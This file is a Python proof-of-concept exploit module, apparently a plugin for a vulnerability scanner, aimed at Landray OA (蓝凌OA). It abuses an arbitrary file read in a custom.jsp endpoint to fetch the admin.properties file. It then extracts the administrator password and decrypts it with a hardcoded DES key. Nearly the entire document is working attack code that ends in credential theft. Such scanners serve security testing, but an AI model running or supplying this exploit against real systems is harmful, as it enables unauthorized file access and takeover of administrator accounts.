# -*- coding:utf-8 -*-
# 蓝凌OA 任意文件读取
import base64
import re

from Crypto.Cipher import DES

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


def descrypt(password):
    key = "kmssAdminKey"[:8].encode()
    des = DES.new(key=key, mode=DES.MODE_ECB)
    text = des.decrypt(base64.b64decode(password))
    return text[:-text[-1]].decode()


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def read_file(self, url, filename="/WEB-INF/KmssConfig/admin.properties"):
        resp = self.requestUtil.post(url + "/sys/ui/extend/varkind/custom.jsp",
                                     data='var={"body":{"file":"%s"}}' % filename)
        return resp.text

    def fingerprint(self):
        try:
            if self.service.url:
                resp = self.requestUtil.get(self.service.url)
                if "蓝凌软件" in resp.text:
                    return True
        except:
            return False

    def poc(self):
        try:
            result = self.read_file(self.service.url)
            password = re.findall(r'password = (.*?)\r', result)[0]
            password = descrypt(password)
            return ["蓝凌OA 任意文件读取", "管理员密码: %s" % password]
        except:
            return []
